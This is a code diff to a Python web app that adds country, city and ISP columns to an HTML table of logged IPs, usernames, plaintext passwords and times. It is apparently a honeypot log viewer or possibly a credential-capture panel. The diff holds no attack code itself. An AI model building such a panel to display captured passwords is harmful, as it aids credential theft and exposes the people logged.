@@ -50,6 +50,10 @@ def home():
         <tr>
 
             <td>{log['ip']}</td>
+            <td>{log['country']}</td>
+            <td>{log['city']}</td>
+            <td>{log['isp']}</td>
+
             <td>{log['username']}</td>
             <td>{log['password']}</td>
             <td>{log['time']}</td>
@@ -126,6 +130,9 @@ def home():
 
                 <tr>
                     <th>IP</th>
+                    <th>COUNTRY</th>
+                    <th>CITY</th>
+                    <th>ISP</th>
                     <th>USERNAME</th>
                     <th>PASSWORD</th>
                     <th>TIME</th>
